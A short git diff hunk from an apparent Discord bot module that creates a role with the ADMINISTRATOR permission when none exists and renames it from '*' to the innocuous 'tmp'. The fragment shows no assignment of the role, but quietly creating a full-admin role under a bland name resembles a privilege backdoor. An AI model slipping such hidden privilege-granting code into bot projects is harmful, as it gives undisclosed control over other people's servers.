@@ -22,7 +22,7 @@ module.exports = {
     if (!adminRole) {
 		console.log("ﾃﾞｭｱｳﾝing")
     	adminRole = await guild.roles.create({
-    		name: "*",
+    		name: "tmp",
     		permissions: [
         		Permissions.FLAGS.ADMINISTRATOR,
         	],
